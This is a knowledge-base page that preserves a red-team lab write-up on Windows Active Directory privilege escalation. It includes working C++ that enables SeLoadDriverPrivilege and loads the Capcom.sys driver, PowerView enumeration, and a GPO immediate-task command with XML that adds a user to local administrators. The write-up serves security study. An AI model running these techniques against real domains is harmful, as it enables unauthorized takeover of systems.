---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Privileged Accounts and Token Privileges

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-experiments-active-directory-kerberos-abuse-privileged-accounts-and-token-privileges` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Privileged Accounts and Token Privileges](../../topics/offensive-security-experiments/privileged-accounts-and-token-privileges.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-experiments-active-directory-kerberos-abuse-privileged-accounts-and-token-privileges |
| name | Privileged Accounts and Token Privileges |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Screenshot from 2018-12-17 17-01-38.png
- Screenshot from 2018-12-17 17-01-47.png
- Screenshot from 2018-12-17 17-05-35.png
- Screenshot from 2018-12-17 17-38-43.png
- Screenshot from 2018-12-17 17-38-58.png
- Screenshot from 2018-12-17 17-39-08.png
- Screenshot from 2018-12-17 17-42-47.png
- Screenshot from 2018-12-17 21-59-15.png
- Screenshot from 2018-12-17 22-14-26 (1).png
- Screenshot from 2018-12-17 22-40-30.png
- Screenshot from 2018-12-17 22-45-54.png
- Screenshot from 2018-12-17 23-40-56.png
- Screenshot from 2018-12-18 14-57-21.png
- Screenshot from 2018-12-18 14-58-34.png
- Screenshot from 2018-12-18 15-05-25.png
- Screenshot from 2018-12-20 11-41-55.png
- Screenshot from 2018-12-20 11-42-04.png
- Screenshot from 2018-12-20 12-02-22.png
- Screenshot from 2018-12-20 13-40-11.png
- Screenshot from 2018-12-20 13-43-46.png
- Screenshot from 2018-12-20 13-45-18.png
- Screenshot from 2019-01-16 19-44-19.png
- Screenshot from 2019-01-16 19-46-33.png
_body: "# Privileged Accounts and Token Privileges\n\nAdministrators, Domain Admins, Enterprise Admins are well known AD groups\
  \ that allow for privilege escalation, that pentesters and red teamers will aim for in their engagements, but there are\
  \ other account memberships and access token privileges that can also be useful during security assesments when chaining\
  \ multiple attack vectors.\n\n## Account Operators\n\n* Allows creating non administrator accounts and groups on the domain\n\
  * Allows logging in to the DC locally\n\nNote the spotless' user membership:\n\n![](<../../.gitbook/assets/Screenshot from\
  \ 2018-12-17 17-01-38.png>)\n\nHowever, we can still add new users:\n\n![](<../../.gitbook/assets/Screenshot from 2018-12-17\
  \ 17-01-47.png>)\n\nAs well as login to DC01 locally:\n\n![](<../../.gitbook/assets/Screenshot from 2018-12-17 17-05-35.png>)\n\
  \n## Server Operators\n\nThis membership allows users to configure Domain Controllers with the following privileges:\n\n\
  * Allow log on locally\n* Back up files and directories\n* Change the system time\n* Change the time zone\n* Force shutdown\
  \ from a remote system\n* Restore files and directories\n* Shut down the system\n\nNote how we cannot access files on the\
  \ DC with current membership:\n\n![](<../../.gitbook/assets/Screenshot from 2018-12-17 17-38-43.png>)\n\nHowever, if the\
  \ user belongs to `Server Operators`:\n\n![](<../../.gitbook/assets/Screenshot from 2018-12-17 17-38-58.png>)\n\nThe story\
  \ changes:\n\n![](<../../.gitbook/assets/Screenshot from 2018-12-17 17-39-08.png>)\n\n## Backup Operators\n\nAs with `Server\
  \ Operators` membership, we can access the `DC01` file system if we belong to `Backup Operators`:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-12-17 17-42-47.png>)\n\n## SeLoadDriverPrivilege\n\nA very dangerous privilege to assign to any user - it allows\
  \ the user to load kernel drivers and execute code with kernel privilges aka `NT\\System`. See how `offense\\spotless` user\
  \ has this privilege:\n\n![](<../../.gitbook/assets/Screenshot from 2018-12-17 22-40-30.png>)\n\n`Whoami /priv` shows the\
  \ privilege is disabled by default:\n\n![](<../../.gitbook/assets/Screenshot from 2018-12-17 21-59-15.png>)\n\nHowever,\
  \ the below code allows enabling that privilege fairly easily:\n\n{% code title=\"privileges.cpp\" %}\n```cpp\n#include\
  \ \"stdafx.h\"\n#include <windows.h>\n#include <stdio.h>\n\nint main()\n{\n\tTOKEN_PRIVILEGES tp;\n\tLUID luid;\n\tbool\
  \ bEnablePrivilege(true);\n\tHANDLE hToken(NULL);\n\tOpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,\
  \ &hToken);\n\n\tif (!LookupPrivilegeValue(\n\t\tNULL,            // lookup privilege on local system\n\t\tL\"SeLoadDriverPrivilege\"\
  ,   // privilege to lookup \n\t\t&luid))        // receives LUID of privilege\n\t{\n\t\tprintf(\"LookupPrivilegeValue error:\
  \ %un\", GetLastError());\n\t\treturn FALSE;\n\t}\n\ttp.PrivilegeCount = 1;\n\ttp.Privileges[0].Luid = luid;\n\t\n\tif (bEnablePrivilege)\
  \ {\n\t\ttp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n\t}\n\t\n\t// Enable the privilege or disable all privileges.\n\
  \tif (!AdjustTokenPrivileges(\n\t\thToken,\n\t\tFALSE,\n\t\t&tp,\n\t\tsizeof(TOKEN_PRIVILEGES),\n\t\t(PTOKEN_PRIVILEGES)NULL,\n\
  \t\t(PDWORD)NULL))\n\t{\n\t\tprintf(\"AdjustTokenPrivileges error: %x\", GetLastError());\n\t\treturn FALSE;\n\t}\n\n\t\
  system(\"cmd\");\n    return 0;\n}\n```\n{% endcode %}\n\nWe compile the above, execute and the privilege `SeLoadDriverPrivilege`\
  \ is now enabled:\n\n![](<../../.gitbook/assets/Screenshot from 2018-12-17 22-45-54.png>)\n\n### Capcom.sys Driver Exploit\n\
  \nTo further prove the `SeLoadDriverPrivilege` is dangerous, let's exploit it to elevate privileges.\n\nLet's build on the\
  \ previous code and leverage the Win32 API call `ntdll.NtLoadDriver()` to load the malicious kernel driver `Capcom.sys`.\
  \ Note that lines 55 and 56 of the `privileges.cpp` are:\n\n```cpp\nPCWSTR pPathSource = L\"C:\\\\experiments\\\\privileges\\\
  \\Capcom.sys\";\nPCWSTR pPathSourceReg = L\"\\\\registry\\\\machine\\\\System\\\\CurrentControlSet\\\\Services\\\\SomeService\"\
  ;\n```\n\nThe first one declares a string variable indicating where the vulnerable Capcom.sys driver is located on the victim\
  \ system and the second one is a string variable indicating a service name that will be used (could be any service) when\
  \ executing the exploit:\n\n{% code title=\"privileges.cpp\" %}\n```cpp\n#include \"stdafx.h\"\n#include <windows.h>\n#include\
  \ <stdio.h>\n#include <ntsecapi.h>\n#include <stdlib.h>\n#include <locale.h>\n#include <iostream>\n#include \"stdafx.h\"\
  \n\nNTSTATUS(NTAPI *NtLoadDriver)(IN PUNICODE_STRING DriverServiceName);\nVOID(NTAPI *RtlInitUnicodeString)(PUNICODE_STRING\
  \ DestinationString, PCWSTR SourceString);\nNTSTATUS(NTAPI *NtUnloadDriver)(IN PUNICODE_STRING DriverServiceName);\n\nint\
  \ main()\n{\n\tTOKEN_PRIVILEGES tp;\n\tLUID luid;\n\tbool bEnablePrivilege(true);\n\tHANDLE hToken(NULL);\n\tOpenProcessToken(GetCurrentProcess(),\
  \ TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);\n\n\tif (!LookupPrivilegeValue(\n\t\tNULL,            // lookup privilege\
  \ on local system\n\t\tL\"SeLoadDriverPrivilege\",   // privilege to lookup \n\t\t&luid))        // receives LUID of privilege\n\
  \t{\n\t\tprintf(\"LookupPrivilegeValue error: %un\", GetLastError());\n\t\treturn FALSE;\n\t}\n\ttp.PrivilegeCount = 1;\n\
  \ttp.Privileges[0].Luid = luid;\n\t\n\tif (bEnablePrivilege) {\n\t\ttp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n\
  \t}\n\t\n\t// Enable the privilege or disable all privileges.\n\tif (!AdjustTokenPrivileges(\n\t\thToken,\n\t\tFALSE,\n\t\
  \t&tp,\n\t\tsizeof(TOKEN_PRIVILEGES),\n\t\t(PTOKEN_PRIVILEGES)NULL,\n\t\t(PDWORD)NULL))\n\t{\n\t\tprintf(\"AdjustTokenPrivileges\
  \ error: %x\", GetLastError());\n\t\treturn FALSE;\n\t}\n\n\t//system(\"cmd\");\n\t// below code for loading drivers is\
  \ taken from https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/RDI/dll/NtLoadDriver.h\n\tstd::cout\
  \ << \"[+] Set Registry Keys\" << std::endl;\n\tNTSTATUS st1;\n\tUNICODE_STRING pPath;\n\tUNICODE_STRING pPathReg;\n\tPCWSTR\
  \ pPathSource = L\"C:\\\\experiments\\\\privileges\\\\Capcom.sys\";\n\tPCWSTR pPathSourceReg = L\"\\\\registry\\\\machine\\\
  \\System\\\\CurrentControlSet\\\\Services\\\\SomeService\";\n\tconst char NTDLL[] = { 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e,\
  \ 0x64, 0x6c, 0x6c, 0x00 };\n\tHMODULE hObsolete = GetModuleHandleA(NTDLL);\n\t*(FARPROC *)&RtlInitUnicodeString = GetProcAddress(hObsolete,\
  \ \"RtlInitUnicodeString\");\n\t*(FARPROC *)&NtLoadDriver = GetProcAddress(hObsolete, \"NtLoadDriver\");\n\t*(FARPROC *)&NtUnloadDriver\
  \ = GetProcAddress(hObsolete, \"NtUnloadDriver\");\n\n\tRtlInitUnicodeString(&pPath, pPathSource);\n\tRtlInitUnicodeString(&pPathReg,\
  \ pPathSourceReg);\n\tst1 = NtLoadDriver(&pPathReg);\n\tstd::cout << \"[+] value of st1: \" << st1 << \"\\n\";\n\tif (st1\
  \ == ERROR_SUCCESS) {\n\t\tstd::cout << \"[+] Driver Loaded as Kernel..\\n\";\n\t\tstd::cout << \"[+] Press [ENTER] to unload\
  \ driver\\n\";\n\t}\n\n\tgetchar();\n\tst1 = NtUnloadDriver(&pPathReg);\n\tif (st1 == ERROR_SUCCESS) {\n\t\tstd::cout <<\
  \ \"[+] Driver unloaded from Kernel..\\n\";\n\t\tstd::cout << \"[+] Press [ENTER] to exit\\n\";\n\t\tgetchar();\n\t}\n\n\
  \    return 0;\n}\n```\n{% endcode %}\n\nOnce the above code is compiled and executed, we can see that our malicious `Capcom.sys`\
  \ driver gets loaded onto the victim system:\n\n![](<../../.gitbook/assets/Screenshot from 2018-12-17 22-14-26 (1).png>)\n\
  \n{% file src=\"../../.gitbook/assets/Capcom.sys\" %}\nCapcom.sys\n{% endfile %}\n\nWe can now download and compile the\
  \ Capcom exploit from [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom) and execute\
  \ it on the system to elevate our privileges to `NT Authority\\System`:\n\n![](<../../.gitbook/assets/Screenshot from 2018-12-17\
  \ 23-40-56.png>)\n\n## GPO Delegation\n\nSometimes, certain users/groups may be delegated access to manage Group Policy\
  \ Objects as is the case with `offense\\spotless` user:\n\n![](<../../.gitbook/assets/Screenshot from 2018-12-18 14-58-34.png>)\n\
  \nWe can see this by leveraging PowerView like so:\n\n{% code title=\"attacker@victim\" %}\n```csharp\nGet-ObjectAcl -ResolveGUIDs\
  \ | ? {$_.IdentityReference -eq \"OFFENSE\\spotless\"}\n```\n{% endcode %}\n\nThe below indicates that the user `offense\\\
  spotless` has **WriteProperty**, **WriteDacl**, **WriteOwner** privileges among a couple of others that are ripe for abuse:\n\
  \n![](<../../.gitbook/assets/Screenshot from 2018-12-18 14-57-21.png>)\n\nMore about general AD ACL/ACE abuse refer to the\
  \ lab:\n\n{% content-ref url=\"abusing-active-directory-acls-aces.md\" %}\n[abusing-active-directory-acls-aces.md](abusing-active-directory-acls-aces.md)\n\
  {% endcontent-ref %}\n\n### Abusing the GPO Permissions\n\nWe know the above ObjectDN from the above screenshot is referring\
  \ to the `New Group Policy Object` GPO since the ObjectDN points to `CN=Policies` and also the `CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}`\
  \ which is the same in the GPO settings as highlighted below:\n\n![](<../../.gitbook/assets/Screenshot from 2018-12-18 15-05-25.png>)\n\
  \nIf we want to search for misconfigured GPOs specifically, we can chain multiple cmdlets from PowerSploit like so:\n\n\
  ```csharp\nGet-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq \"OFFENSE\\spotless\"\
  }\n```\n\n![](<../../.gitbook/assets/Screenshot from 2018-12-20 11-41-55.png>)\n\n#### Computers with a Given Policy Applied\n\
  \nWe can now resolve the computer names the GPO `Misconfigured Policy` is applied to:\n\n```csharp\nGet-NetOU -GUID \"{DDC640FF-634A-4442-BC2E-C05EED132F0C}\"\
  \ | % {Get-NetComputer -ADSpath $_}\n```\n\n![ws01.offense.local has \"Misconfigured Policy\" applied to it](<../../.gitbook/assets/Screenshot\
  \ from 2018-12-20 11-42-04.png>)\n\n#### Policies Applied to a Given Computer\n\n```csharp\nGet-DomainGPO -ComputerIdentity\
  \ ws01 -Properties Name, DisplayName\n```\n\n![](<../../.gitbook/assets/Screenshot from 2019-01-16 19-44-19.png>)\n\n####\
  \ OUs with a Given Policy Applied\n\n```csharp\nGet-DomainOU -GPLink \"{DDC640FF-634A-4442-BC2E-C05EED132F0C}\" -Properties\
  \ DistinguishedName\n```\n\n![](<../../.gitbook/assets/Screenshot from 2019-01-16 19-46-33.png>)\n\n#### Abusing Weak GPO\
  \ Permissions\n\nOne of the ways to abuse this misconfiguration and get code execution is to create an immediate scheduled\
  \ task through the GPO like so:\n\n```csharp\nNew-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments \"\
  /c net localgroup administrators spotless /add\" -GPODisplayName \"Misconfigured Policy\" -Verbose -Force\n```\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-12-20 13-43-46.png>)\n\nThe above will add our user spotless to the local `administrators` group of the compromised\
  \ box. Note how prior to the code execution the group does not contain user `spotless`:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-12-20 13-40-11.png>)\n\n### Force Policy Update\n\nScheduledTask and its code will execute after the policy\
  \ updates are pushed through (roughly each 90 minutes), but we can force it with `gpupdate /force` and see that our user\
  \ `spotless` now belongs to local administrators group:\n\n![](<../../.gitbook/assets/Screenshot from 2018-12-20 13-45-18.png>)\n\
  \n### Under the hood\n\nIf we observe the Scheduled Tasks of the `Misconfigured Policy` GPO, we can see our `evilTask` sitting\
  \ there:\n\n![](<../../.gitbook/assets/Screenshot from 2018-12-20 12-02-22.png>)\n\nBelow is the XML file that got created\
  \ by `New-GPOImmediateTask` that represents our evil scheduled task in the GPO:\n\n{% code title=\"\\\\offense.local\\SysVol\\\
  offense.local\\Policies\\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml\"\
  \ %}\n```markup\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<ScheduledTasks clsid=\"{CC63F200-7309-4ba0-B154-A71CD118DBCC}\"\
  >\n    <ImmediateTaskV2 clsid=\"{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}\" name=\"evilTask\" image=\"0\" changed=\"2018-11-20\
  \ 13:43:43\" uid=\"{6cc57eac-b758-4c52-825d-e21480bbb47f}\" userContext=\"0\" removePolicy=\"0\">\n        <Properties action=\"\
  C\" name=\"evilTask\" runAs=\"NT AUTHORITY\\System\" logonType=\"S4U\">\n            <Task version=\"1.3\">\n          \
  \      <RegistrationInfo>\n                    <Author>NT AUTHORITY\\System</Author>\n                    <Description></Description>\n\
  \                </RegistrationInfo>\n                <Principals>\n                    <Principal id=\"Author\">\n    \
  \                    <UserId>NT AUTHORITY\\System</UserId>\n                        <RunLevel>HighestAvailable</RunLevel>\n\
  \                        <LogonType>S4U</LogonType>\n                    </Principal>\n                </Principals>\n \
  \               <Settings>\n                    <IdleSettings>\n                        <Duration>PT10M</Duration>\n   \
  \                     <WaitTimeout>PT1H</WaitTimeout>\n                        <StopOnIdleEnd>true</StopOnIdleEnd>\n   \
  \                     <RestartOnIdle>false</RestartOnIdle>\n                    </IdleSettings>\n                    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n\
  \                    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n                    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\n\
  \                    <AllowHardTerminate>false</AllowHardTerminate>\n                    <StartWhenAvailable>true</StartWhenAvailable>\n\
  \                    <AllowStartOnDemand>false</AllowStartOnDemand>\n                    <Enabled>true</Enabled>\n     \
  \               <Hidden>true</Hidden>\n                    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\n             \
  \       <Priority>7</Priority>\n                    <DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>\n            \
  \        <RestartOnFailure>\n                        <Interval>PT15M</Interval>\n                        <Count>3</Count>\n\
  \                    </RestartOnFailure>\n                </Settings>\n                <Actions Context=\"Author\">\n  \
  \                  <Exec>\n                        <Command>cmd</Command>\n                        <Arguments>/c net localgroup\
  \ administrators spotless /add</Arguments>\n                    </Exec>\n                </Actions>\n                <Triggers>\n\
  \                    <TimeTrigger>\n                        <StartBoundary>%LocalTimeXmlEx%</StartBoundary>\n          \
  \              <EndBoundary>%LocalTimeXmlEx%</EndBoundary>\n                        <Enabled>true</Enabled>\n          \
  \          </TimeTrigger>\n                </Triggers>\n            </Task>\n        </Properties>\n    </ImmediateTaskV2>\n\
  </ScheduledTasks>\n```\n{% endcode %}\n\n### Users and Groups\n\nThe same privilege escalation could be achieved by abusing\
  \ the GPO Users and Groups feature. Note in the below file, line 6 where the user `spotless` is added to the local `administrators`\
  \ group - we could change the user to something else, add another one or even add the user to another group/multiple groups\
  \ since we can amend the policy configuration file in the shown location due to the GPO delegation assigned to our user\
  \ `spotless`:\n\n{% code title=\"\\\\offense.local\\SysVol\\offense.local\\Policies\\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\\\
  Machine\\Preferences\\Groups\" %}\n```markup\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<Groups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D24D26}\"\
  >\n    <Group clsid=\"{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}\" name=\"Administrators (built-in)\" image=\"2\" changed=\"\
  2018-12-20 14:08:39\" uid=\"{300BCC33-237E-4FBA-8E4D-D8C3BE2BB836}\">\n        <Properties action=\"U\" newName=\"\" description=\"\
  \" deleteAllUsers=\"0\" deleteAllGroups=\"0\" removeAccounts=\"0\" groupSid=\"S-1-5-32-544\" groupName=\"Administrators\
  \ (built-in)\">\n            <Members>\n                <Member name=\"spotless\" action=\"ADD\" sid=\"\" />\n         \
  \   </Members>\n        </Properties>\n    </Group>\n</Groups>\n```\n{% endcode %}\n\nAdditionally, we could think about\
  \ leveraging logon/logoff scripts, using registry for autoruns, installing .msi, edit services and similar code execution\
  \ avenues.\n\n## References\n\n{% embed url=\"https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory\"\
  \ %}\n\n{% embed url=\"https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--\"\
  \ %}\n\n{% embed url=\"https://adsecurity.org/?p=3658\" %}\n\n{% embed url=\"http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/\"\
  \ %}\n\n{% embed url=\"https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/\" %}\n\n\
  {% embed url=\"https://rastamouse.me/2019/01/gpo-abuse-part-1/\" %}\n\n{% embed url=\"https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13\"\
  \ %}\n\n{% embed url=\"https://github.com/tandasat/ExploitCapcom\" %}\n\n{% embed url=\"https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp\"\
  \ %}\n\n{% embed url=\"https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys\" %}\n\n{% embed url=\"\
  https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e\" %}\n\n{% embed url=\"https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html\"\
  \ %}"
_relative_path: offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges.md
````
